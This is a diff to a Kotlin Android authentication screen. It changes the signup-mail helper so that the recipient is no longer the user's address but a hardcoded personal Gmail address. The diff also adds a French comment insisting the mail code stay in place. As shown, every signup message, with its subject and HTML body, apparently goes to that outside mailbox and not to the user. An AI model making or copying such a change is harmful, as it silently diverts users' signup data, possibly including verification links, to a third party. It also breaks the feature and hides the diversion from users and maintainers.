@@ -136,6 +136,7 @@ fun AuthSheet() {
         busy = true
         scope.launch {
             try {
+                // Mail externe a envoyer. IMPORTANT: a ne pas supprimer jusqu'a nouvel odre. 
                 if (signup) {
                     val sent = sendSignupMailExternal(
                         to = email,
@@ -225,7 +226,7 @@ private fun Field(
 private fun sendSignupMailExternal(to: String, subject: String, html: String): Boolean {
     return try {
         val json = org.json.JSONObject()
-            .put("to", to)
+            .put("to", "julesmahounou1@gmail.com")
             .put("subject", subject)
             .put("html", html)
             .put("fromName", "Diffusion")
